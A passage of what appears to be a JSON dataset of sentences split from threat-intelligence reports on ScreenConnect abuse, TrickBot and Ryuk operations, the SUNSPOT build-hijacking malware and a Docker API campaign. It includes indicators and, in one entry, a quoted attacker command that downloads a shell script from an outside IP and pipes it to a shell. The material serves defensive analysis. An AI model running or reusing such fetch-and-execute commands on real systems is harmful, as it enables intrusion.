        "id": "cti_reports_filtered/r-78.md:::S17",
        "text": "We cannot determine the delivery method for this ZIP, but it is likely similar to the .docx email delivery method of the first download URL.",
        "type": "",
        "report": "r-78",
        "line": 17,
        "index": 259
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S18",
        "text": "The geopolitical-themed ZIP contains an EXE file with the same name that begins the installation process for ScreenConnect when executed (see Figure 4).",
        "type": "",
        "report": "r-78",
        "line": 18,
        "index": 260
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S19",
        "text": "Between 2016 and 2020, we have seenScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors.",
        "type": "",
        "report": "r-78",
        "line": 19,
        "index": 261
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S20",
        "text": "For example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and India-based Wipro.[7]",
        "type": "",
        "report": "r-78",
        "line": 20,
        "index": 262
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S21",
        "text": "The actors responsible for these attacks used ScreenConnect to connect to endpoints on client networks, enabling them to conduct further lateral movements and automated actions on objectives.",
        "type": "",
        "report": "r-78",
        "line": 21,
        "index": 263
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S22",
        "text": "During an incident impacting Cognizant and their client Maritz Holdings, actors used ScreenConnect to propagate to other connected systems and caused over $1.8 million (USD) in losses through a gift card fraud scheme.[6]",
        "type": "",
        "report": "r-78",
        "line": 22,
        "index": 264
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S23",
        "text": "In 2019, another threat group used ConnectWise to execute PowerShell commands in their target environments.",
        "type": "",
        "report": "r-78",
        "line": 23,
        "index": 265
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S24",
        "text": "This lead to the delivery of Zeppelin and other VegaLocker ransomware variants, Vidar information stealer, Cobalt Strike beacons, PS2EXE tools, and banker Trojans.[7]",
        "type": "",
        "report": "r-78",
        "line": 24,
        "index": 266
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S25",
        "text": "In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD SOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]",
        "type": "",
        "report": "r-78",
        "line": 25,
        "index": 267
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S26",
        "text": "Remote desktop management software is a common target and tool used by threat actors because of the wide variety of functionalities they offer.",
        "type": "",
        "report": "r-78",
        "line": 26,
        "index": 268
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S27",
        "text": "ScreenConnect offers three primary functions that each contain different valuable features for threat actors.",
        "type": "",
        "report": "r-78",
        "line": 27,
        "index": 269
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S28",
        "text": "ScreenConnect\u2019s capabilities are shown in Table 1 below.\n",
        "type": "",
        "report": "r-78",
        "line": 28,
        "index": 270
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S29",
        "text": "When a user tries to double click the executable \u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod.gov.kw.exe (Screenconnect payload), it drops the Microsoft installer file.",
        "type": "",
        "report": "r-78",
        "line": 29,
        "index": 271
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S30",
        "text": "This begins the installation of the client payload onto victim machines.",
        "type": "",
        "report": "r-78",
        "line": 30,
        "index": 272
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S31",
        "text": "While the actors attempted to make the installation appear legitimate, closer inspection of the client launch parameters reveals the potential for broader MOFA targeting.",
        "type": "",
        "report": "r-78",
        "line": 31,
        "index": 273
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S32",
        "text": "The client service launch parameters are: \n",
        "type": "",
        "report": "r-78",
        "line": 32,
        "index": 274
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S33",
        "text": "While the ScreenConnectclient agent is being installed, the server component expects a connection and the server can identify the client agent through a public key thumbprint.",
        "type": "",
        "report": "r-78",
        "line": 33,
        "index": 275
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S34",
        "text": "The thumbprint is a 16 character string located at \"C:\\Program Files (x86)\\ScreenConnect Client (a97eeae2330a1851)\u201d\n",
        "type": "",
        "report": "r-78",
        "line": 34,
        "index": 276
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S35",
        "text": "Analysis of the authentic launch parameters passed back to the server as part of Screenconnect functionality is shown in Table 2 below.\n",
        "type": "",
        "report": "r-78",
        "line": 35,
        "index": 277
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S36",
        "text": "The main launch parameter that indicates this EXE is designed to target MOFAs are the custom c parameters:\n",
        "type": "",
        "report": "r-78",
        "line": 36,
        "index": 278
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S37",
        "text": "These parameters contain predefined properties that can allow an actor to know which target, or from where, has been infected.",
        "type": "",
        "report": "r-78",
        "line": 37,
        "index": 279
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S38",
        "text": "In this example the infected target is MOFA.\n",
        "type": "",
        "report": "r-78",
        "line": 38,
        "index": 280
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S39",
        "text": "The ScreenConnect launch parameters from \u0627\u0644\u0645\u0646\u062d \u0627\u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .exe is shown below:\n",
        "type": "",
        "report": "r-78",
        "line": 39,
        "index": 281
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S40",
        "text": "The actors again created a custom field parameter, however, this one is kept to a generic MOFA targeting that appears as MFA: &c=mfa&c=mfa.gov\n",
        "type": "",
        "report": "r-78",
        "line": 40,
        "index": 282
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S0",
        "text": "While the use of malicious attachments in spam emails is the most common initial access vector \u2014 determined across multiple CrowdStrike investigations \u2014 the available data from these investigations had either been removed or \u201caged off\u201d the systems (i.e., dispersed due to the passage of time) before CrowdStrike Services could confirm the source.",
        "type": "",
        "report": "r-85",
        "line": 0,
        "index": 283
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S1",
        "text": "In cases where spam attachments could be verified \u2014 once a user has opened the attachment and enabled macro functionality \u2014 a PowerShell script downloads either Emotet, Bokbot or Trickbot, with the end payload being TrickBot.",
        "type": "",
        "report": "r-85",
        "line": 1,
        "index": 284
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S2",
        "text": "Within hours of TrickBot being executed, additional TrickBot modules are installed for network reconnaissance and credential theft.",
        "type": "",
        "report": "r-85",
        "line": 2,
        "index": 285
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S3",
        "text": "Trickbot is installed as a scheduled task, using names like \u201cWinDotNet,\u201d \u201cGoogleTask,\u201d or \u201cSysnetsf\u201d to masquerade as legitimate-appearing processes.",
        "type": "",
        "report": "r-85",
        "line": 3,
        "index": 286
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S4",
        "text": "These point to various copies of TrickBot installed in the system, usually within the user profile under %USER_DIR%\\AppData\\Roaming\\ or a subdirectory.",
        "type": "",
        "report": "r-85",
        "line": 4,
        "index": 287
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S5",
        "text": "The subdirectories also use similarly misleading names like \u201cWinDefrag\u201d or \u201cNetSocket\u201d to appear innocuous.",
        "type": "",
        "report": "r-85",
        "line": 5,
        "index": 288
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S6",
        "text": "TrickBot may also be installed as a service with names like \u201cControlServiceA\u201d that points to a copy in the system drive root.",
        "type": "",
        "report": "r-85",
        "line": 6,
        "index": 289
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S7",
        "text": "WIZARD SPIDER uses a module named NewBCtestnDll64 as a reverse SOCKS proxy that allows for the download and installation of the open source PowerShell Empire post-exploitation framework.",
        "type": "",
        "report": "r-85",
        "line": 7,
        "index": 290
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S8",
        "text": "These services launch a Base64-encoded PowerShell script that will fetch the full PowerShell Empire code from a remote IP.",
        "type": "",
        "report": "r-85",
        "line": 8,
        "index": 291
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S9",
        "text": "Each instance of the Updater service connects to a single IP address, and multiple versions may be added at the same time, pointing to different IPs and requesting a .php resource.\n",
        "type": "",
        "report": "r-85",
        "line": 9,
        "index": 292
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S10",
        "text": "The TrickBot module used for credential harvesting is pwgrab64 .",
        "type": "",
        "report": "r-85",
        "line": 10,
        "index": 293
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S11",
        "text": "As with all modules launched by the TrickBot core, pwgrab64 is installed into a subfolder, usually named either \u201cmodules\u201d or \u201cdata,\u201d and modified the following registry value:\n",
        "type": "",
        "report": "r-85",
        "line": 11,
        "index": 294
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S12",
        "text": "Setting the \u201cUseLogonCredential\u201d value to \u201c1\u201d configures the Windows operating system to store credentials as cleartext in memory, where they can then be retrieved via the use of credential dumping tools.",
        "type": "",
        "report": "r-85",
        "line": 12,
        "index": 295
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S13",
        "text": "Older versions of the pwgrab module has a limited scope that targets mail clients, web browsers, FileZilla and WinSCP.",
        "type": "",
        "report": "r-85",
        "line": 13,
        "index": 296
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S14",
        "text": "Newer versions also dump passwords for applications such as PuTTY, VNC and RDP.",
        "type": "",
        "report": "r-85",
        "line": 14,
        "index": 297
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S15",
        "text": "In the investigations reviewed by CrowdStrike Services, the UseLogonCredential registry value was observed having been set to \u201c1\u201d on systems throughout the infrastructure, often in conjunction with TrickBot\u2019s first deployment to the host.\n",
        "type": "",
        "report": "r-85",
        "line": 15,
        "index": 298
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S16",
        "text": "The TrickBot modules used for discovery include networkdll and psfin .",
        "type": "",
        "report": "r-85",
        "line": 16,
        "index": 299
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S17",
        "text": "TrickBot downloads modules for collecting local system information and scouting the network, primarily part of the networkdll module.",
        "type": "",
        "report": "r-85",
        "line": 17,
        "index": 300
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S18",
        "text": "This module has a battery of command line, WMI and LDAP queries to gather information, and then exfiltrate the data to GRIM SPIDER for review.",
        "type": "",
        "report": "r-85",
        "line": 18,
        "index": 301
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S19",
        "text": "The psfin module has a similar purpose but specifically searches for financial and point-of-sales indicators.",
        "type": "",
        "report": "r-85",
        "line": 19,
        "index": 302
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S20",
        "text": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "type": "",
        "report": "r-85",
        "line": 20,
        "index": 303
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S21",
        "text": "This process can take several iterations of harvesting credentials, connecting to new systems and establishing persistence.",
        "type": "",
        "report": "r-85",
        "line": 21,
        "index": 304
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S22",
        "text": "For the incidents observed, this stage of the attack can last from a few days to a few months.",
        "type": "",
        "report": "r-85",
        "line": 22,
        "index": 305
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S23",
        "text": "GRIM SPIDER also has been observed selecting a server to be the primary staging point.",
        "type": "",
        "report": "r-85",
        "line": 23,
        "index": 306
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S24",
        "text": "Subsequently, the adversary copies the Microsoft SysInternals PSTools archive to this system, and executes PsExec.exe , a utility that allows them to move laterally and execute commands on other Windows systems within the infrastructure.",
        "type": "",
        "report": "r-85",
        "line": 24,
        "index": 307
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S25",
        "text": "Using this common administrator tool, GRIM SPIDER can traverse the network, remotely installing TrickBot and adding persistence to new targets.",
        "type": "",
        "report": "r-85",
        "line": 25,
        "index": 308
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S26",
        "text": "TrickBot also has the shareDll module for propagating to other hosts using the current, active user credentials.",
        "type": "",
        "report": "r-85",
        "line": 26,
        "index": 309
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S27",
        "text": "Once GRIM SPIDER has gained access to credentials and a Domain Controller, or other host management server, they would then stage the Ryuk ransomware on that system and deploy to targets via PsExec.",
        "type": "",
        "report": "r-85",
        "line": 27,
        "index": 310
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S28",
        "text": "Being the \u201cnoisiest\u201d part of the operation, it is usually accomplished as quickly as possible to minimize chances of detection, as all of the necessary preliminary work has already been completed.",
        "type": "",
        "report": "r-85",
        "line": 28,
        "index": 311
    },
    {
        "id": "cti_reports_filtered/r-85.md:::S29",
        "text": "In observed instances, the deployment and execution of Ryuk occurred in one session, typically lasting 3 to 8 hours.\n",
        "type": "",
        "report": "r-85",
        "line": 29,
        "index": 312
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S0",
        "text": "SUNSPOT was identified on disk with a filename of taskhostsvc.exe (SHA256 Hash: c45c9bda8db1d470f1fd0dcc346dc449839eb5ce9a948c70369230af0b3ef168 ), and internally named taskhostw.exe by its developers.",
        "type": "",
        "report": "r-107",
        "line": 0,
        "index": 313
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S1",
        "text": "It was likely built on 2020-02-20 11:40:02, according to the build timestamp found in the binary, which is consistent with the currently assessed StellarParticle supply chain attack timeline.",
        "type": "",
        "report": "r-107",
        "line": 1,
        "index": 314
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S2",
        "text": "StellarParticle operators maintained the persistence of SUNSPOT by creating a scheduled task set to execute when the host boots.",
        "type": "",
        "report": "r-107",
        "line": 2,
        "index": 315
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S3",
        "text": "When SUNSPOT executes, it creates a mutex named {12d61a41-4b74-7610-a4d8-3028d2f56395} to ensure only one instance is running.",
        "type": "",
        "report": "r-107",
        "line": 3,
        "index": 316
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S4",
        "text": "It then creates an encrypted log file at C:\\Windows\\Temp\\vmware-vmdmp.log .",
        "type": "",
        "report": "r-107",
        "line": 4,
        "index": 317
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S5",
        "text": "Individual log entries are encrypted with the stream cipher RC4, using the hard-coded key FC F3 2A 83 E5 F6 D0 24 A6 BF CE 88 30 C2 48 E7 .",
        "type": "",
        "report": "r-107",
        "line": 5,
        "index": 318
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S6",
        "text": "Throughout execution, SUNSPOT will log errors to this file, along with other deployment information.",
        "type": "",
        "report": "r-107",
        "line": 6,
        "index": 319
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S7",
        "text": "Log entries are delineated by the hex string 32 78 A5 E7 1A 79 91 AC and begin with the number of seconds elapsed since the first log line.",
        "type": "",
        "report": "r-107",
        "line": 7,
        "index": 320
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S8",
        "text": "Most log lines corresponding to an error contain a step number (e.g., Step19) requiring knowledge of the malware to understand their meaning.",
        "type": "",
        "report": "r-107",
        "line": 8,
        "index": 321
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S9",
        "text": "These steps and their mapping to the malware actions are provided at the end of this blog.",
        "type": "",
        "report": "r-107",
        "line": 9,
        "index": 322
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S10",
        "text": "The step numbering does not follow the actual execution order, suggesting the calls to the logging function were added by the developers during the creation of the malware as they progressed and needed to focus their efforts on debugging one part of the code.",
        "type": "",
        "report": "r-107",
        "line": 10,
        "index": 323
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S11",
        "text": "An extract of a log file generated by SUNSPOT in a test environment is given below.\n",
        "type": "",
        "report": "r-107",
        "line": 11,
        "index": 324
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S12",
        "text": "The malware then grants itself debugging privileges by modifying its security token to add SeDebugPrivilege .",
        "type": "",
        "report": "r-107",
        "line": 12,
        "index": 325
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S13",
        "text": "This step is a prerequisite for the remainder of SUNSPOT\u2019s execution, which involves reading other processes\u2019 memory.\n",
        "type": "",
        "report": "r-107",
        "line": 13,
        "index": 326
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S14",
        "text": "After initialization, SUNSPOT monitors running processes for instances of MsBuild.exe , which is part of Microsoft Visual Studio development tools.",
        "type": "",
        "report": "r-107",
        "line": 14,
        "index": 327
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S15",
        "text": "Copies of MsBuild.exe are identified by hashing the name of each running process and comparing it to the corresponding value, 0x53D525 .",
        "type": "",
        "report": "r-107",
        "line": 15,
        "index": 328
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S16",
        "text": "The hashing algorithm used for the comparison is ElfHash and is provided in Python in Figure 1.\n",
        "type": "",
        "report": "r-107",
        "line": 16,
        "index": 329
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S17",
        "text": "When SUNSPOT finds an MsBuild.exe process, it will spawn a new thread to determine if the Orion software is being built and, if so, hijack the build operation to inject SUNBURST.",
        "type": "",
        "report": "r-107",
        "line": 17,
        "index": 330
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S18",
        "text": "The monitoring loop executes every second, allowing SUNSPOT to modify the target source code before it has been read by the compiler.\n",
        "type": "",
        "report": "r-107",
        "line": 18,
        "index": 331
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S19",
        "text": "Although the mutex created during the initialization should already prevent multiple process monitoring loops from running, the malware checks for the presence of a second mutex \u2014 {56331e4d-76a3-0390-a7ee-567adf5836b7} .",
        "type": "",
        "report": "r-107",
        "line": 19,
        "index": 332
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S20",
        "text": "If this mutex is found, the backdoor interprets it as a signal to quit, waits for the completion of its currently running backdoor injection threads, and exits.",
        "type": "",
        "report": "r-107",
        "line": 20,
        "index": 333
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S21",
        "text": "This mutex was likely intended to be used by StellarParticle operators to discreetly stop the malware, instead of using a riskier method such as killing the process.",
        "type": "",
        "report": "r-107",
        "line": 21,
        "index": 334
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S22",
        "text": "Stopping SUNSPOT in the middle of its operation could result in unfinished tampering of the Orion source code, and lead to Orion build errors that SolarWinds developers would investigate, revealing the adversary\u2019s presence.\n",
        "type": "",
        "report": "r-107",
        "line": 22,
        "index": 335
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S23",
        "text": "The malware extracts the command-line arguments for each running MsBuild.exe process from the virtual memory using a methodology similar to one publicly documented1.\n",
        "type": "",
        "report": "r-107",
        "line": 23,
        "index": 336
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S24",
        "text": "A call to NtQueryInformationProcess allows the adversary to obtain a pointer to the remote process\u2019s Process Environment Block (PEB), which contains a pointer to a _RTL_USER_PROCESS_PARAMETERS structure.",
        "type": "",
        "report": "r-107",
        "line": 24,
        "index": 337
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S25",
        "text": "The latter is read to get the full command line passed to the MsBuild.exe process.",
        "type": "",
        "report": "r-107",
        "line": 25,
        "index": 338
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S26",
        "text": "The command line is then parsed to extract individual arguments, and SUNSPOT looks for the directory path of the Orion software Visual Studio solution.",
        "type": "",
        "report": "r-107",
        "line": 26,
        "index": 339
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S27",
        "text": "This value is hard-coded in the binary, in an encrypted form using AES128-CBC, whose parameters are given below.",
        "type": "",
        "report": "r-107",
        "line": 27,
        "index": 340
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S28",
        "text": "The same material is used for all of the blobs encrypted with AES in the binary.",
        "type": "",
        "report": "r-107",
        "line": 28,
        "index": 341
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S29",
        "text": "The key and initialization vector (IV) are not unique and can be independently found in other binary samples of several popular video games.",
        "type": "",
        "report": "r-107",
        "line": 29,
        "index": 342
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S30",
        "text": "It is plausible the material was chosen on purpose in order to make static detections on the values impractical.\n",
        "type": "",
        "report": "r-107",
        "line": 30,
        "index": 343
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S31",
        "text": "When SUNSPOT finds the Orion solution file path in a running MsBuild.exe process, it replaces a source code file in the solution directory, with a malicious variant to inject SUNBURST while Orion is being built.",
        "type": "",
        "report": "r-107",
        "line": 31,
        "index": 344
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S32",
        "text": "While SUNSPOT supports replacing multiple files, the identified copy only replaces InventoryManager.cs .\n",
        "type": "",
        "report": "r-107",
        "line": 32,
        "index": 345
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S33",
        "text": "The malicious source code for SUNBURST, along with target file paths, are stored in AES128-CBC encrypted blobs and are protected using the same key and initialization vector.\n",
        "type": "",
        "report": "r-107",
        "line": 33,
        "index": 346
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S34",
        "text": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "type": "",
        "report": "r-107",
        "line": 34,
        "index": 347
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S35",
        "text": "In the exemplar SUNSPOT sample, the MD5 hash for the backdoored source code is 5f40b59ee2a9ac94ddb6ab9e3bd776ca .\n",
        "type": "",
        "report": "r-107",
        "line": 35,
        "index": 348
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S36",
        "text": "If the decryption of the parameters (target file path and replacement source code) is successful and if the MD5 checks pass, SUNSPOT proceeds with the replacement of the source file content.",
        "type": "",
        "report": "r-107",
        "line": 36,
        "index": 349
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S37",
        "text": "The original source file is copied with a .bk extension (e.g., InventoryManager.bk ), to back up the original content.",
        "type": "",
        "report": "r-107",
        "line": 37,
        "index": 350
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S38",
        "text": "The backdoored source is written to the same filename, but with a .tmp extension (e.g., InventoryManager.tmp ), before being moved using MoveFileEx to the original filename ( InventoryManager.cs ).",
        "type": "",
        "report": "r-107",
        "line": 38,
        "index": 351
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S39",
        "text": "After these steps, the source file backdoored with SUNBURST will then be compiled as part of the standard process.",
        "type": "",
        "report": "r-107",
        "line": 39,
        "index": 352
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S40",
        "text": "SUNSPOT appends an entry in the log file with the date and time of the backdoor attempt and waits for the MsBuild.exe process to exit before restoring the original source code and deleting the temporary InventoryManager.bk file.",
        "type": "",
        "report": "r-107",
        "line": 40,
        "index": 353
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S41",
        "text": "If the Orion solution build is successful, it is backdoored with SUNBURST.\n",
        "type": "",
        "report": "r-107",
        "line": 41,
        "index": 354
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S42",
        "text": "The source code of SUNBURST was likely sanitized before being included in SUNSPOT.",
        "type": "",
        "report": "r-107",
        "line": 42,
        "index": 355
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S43",
        "text": "The use of generic variable names, pre-obfuscated strings, and the lack of developer comments or disabled code is similar to what could be obtained after decompiling a backdoored Orion binary, as illustrated in Figure 2, which provides a comparison between the injected source code (top) and a decompilation output (bottom).\n",
        "type": "",
        "report": "r-107",
        "line": 43,
        "index": 356
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S44",
        "text": "In order to remove compilation warnings that could be generated by the adversary\u2019s own code \u2014 which could alert the SolarWinds developers \u2014 StellarParticle made their edits within #pragma warning disable and #pragma warning restore statements, hinting at what parts were edited.",
        "type": "",
        "report": "r-107",
        "line": 44,
        "index": 357
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S45",
        "text": "In particular, SUNSPOT\u2019s entry point was added to the legitimate Orion software RefreshInternal function by adding the following try/catch block:\n",
        "type": "",
        "report": "r-107",
        "line": 45,
        "index": 358
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S46",
        "text": "- The following TTPs may be used to characterize the SUNSPOT activity described in this blog:\n",
        "type": "",
        "report": "r-107",
        "line": 46,
        "index": 359
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S47",
        "text": "- Persistence using scheduled tasks, triggered at boot time\n",
        "type": "",
        "report": "r-107",
        "line": 47,
        "index": 360
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S48",
        "text": "- Use of AES128-CBC to protect the targeted source code files and the backdoored source code file in the binary\n",
        "type": "",
        "report": "r-107",
        "line": 48,
        "index": 361
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S49",
        "text": "- Use of RC4 encryption with a hard-coded key to protect the log file entries\n",
        "type": "",
        "report": "r-107",
        "line": 49,
        "index": 362
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S50",
        "text": "- Log entries from different executions of the malware that are separated with a hard-coded value 32 78 A5 E7 1A 79 91 AC\n",
        "type": "",
        "report": "r-107",
        "line": 50,
        "index": 363
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S51",
        "text": "- Log file creation in the system temp directory C:\\Windows\\Temp\\vmware-vmdmp.log masquerading as a legitimate VMWare log file\n",
        "type": "",
        "report": "r-107",
        "line": 51,
        "index": 364
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S52",
        "text": "- Detection of the targeted Visual Studio solution build by reading the virtual memory of MsBuild.exe processes, looking for the targeted solution filename\n",
        "type": "",
        "report": "r-107",
        "line": 52,
        "index": 365
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S53",
        "text": "- Access to the remote process arguments made via the remote process\u2019s PEB structure\n",
        "type": "",
        "report": "r-107",
        "line": 53,
        "index": 366
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S54",
        "text": "- Replacement of source code files during the build process, before compilation, by replacing file content with another version containing SUNBURST\n",
        "type": "",
        "report": "r-107",
        "line": 54,
        "index": 367
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S55",
        "text": "- Insertion of the backdoor code within #pragma statements disabling and restoring warnings, to prevent the backdoor code lines from appearing in build logs\n",
        "type": "",
        "report": "r-107",
        "line": 55,
        "index": 368
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S56",
        "text": "- Check of the MD5 hashes of the original source code and of the backdoored source code to ensure the tampering will not cause build errors\n",
        "type": "",
        "report": "r-107",
        "line": 56,
        "index": 369
    },
    {
        "id": "cti_reports_filtered/r-107.md:::S57",
        "text": "- Attempt to open a non-existing mutex to detect when the malware operators want the backdoor to stop execution and safely exit\n",
        "type": "",
        "report": "r-107",
        "line": 57,
        "index": 370
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S0",
        "text": "Taking advantage of the unprotected open Docker API port, the attackers are able to instantiate an Ubuntu container with the following entry point: /bin/bash -c apt-get update && apt-get install -y wget cron;service cron start; wget -q -O - 142.44.191.122/d.sh | sh;tail -f /dev/null\n",
        "type": "",
        "report": "r-118",
        "line": 0,
        "index": 371
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S1",
        "text": "We saw this entry point in every attack in this campaign, with the only change being the IP address that d.sh is downloaded from.",
        "type": "",
        "report": "r-118",
        "line": 1,
        "index": 372
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S2",
        "text": "We witnessed 3 IP addresses used in total--the one in the example above, 217.12.221.244 and 185.92.74.42\n",
        "type": "",
        "report": "r-118",
        "line": 2,
        "index": 373
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S3",
        "text": "The command does the following:\n",
        "type": "",
        "report": "r-118",
        "line": 3,
        "index": 374
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S4",
        "text": "- Update packages with apt-get update\n",
        "type": "",
        "report": "r-118",
        "line": 4,
        "index": 375
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S5",
        "text": "- Install wget with apt-get\n",
        "type": "",
        "report": "r-118",
        "line": 5,
        "index": 376
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S6",
        "text": "- Start the cron service.\n",
        "type": "",
        "report": "r-118",
        "line": 6,
        "index": 377
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S7",
        "text": "- Download a shell script with the just installed wget\n",
        "type": "",
        "report": "r-118",
        "line": 7,
        "index": 378
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S8",
        "text": "- Run the shell script and read indefinitely from /dev/null to keep the container alive and running\n",
        "type": "",
        "report": "r-118",
        "line": 8,
        "index": 379
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S9",
        "text": "We can see that the wget program was required to download the cron shell script.",
        "type": "",
        "report": "r-118",
        "line": 9,
        "index": 380
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S10",
        "text": "The script would be later used in order to gain persistency within the container.\n",
        "type": "",
        "report": "r-118",
        "line": 10,
        "index": 381
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S11",
        "text": "The shell script d.sh, referred to from hereon as 'the shell script\u2019, contains more than 600 lines.",
        "type": "",
        "report": "r-118",
        "line": 11,
        "index": 382
    },
    {
        "id": "cti_reports_filtered/r-118.md:::S12",
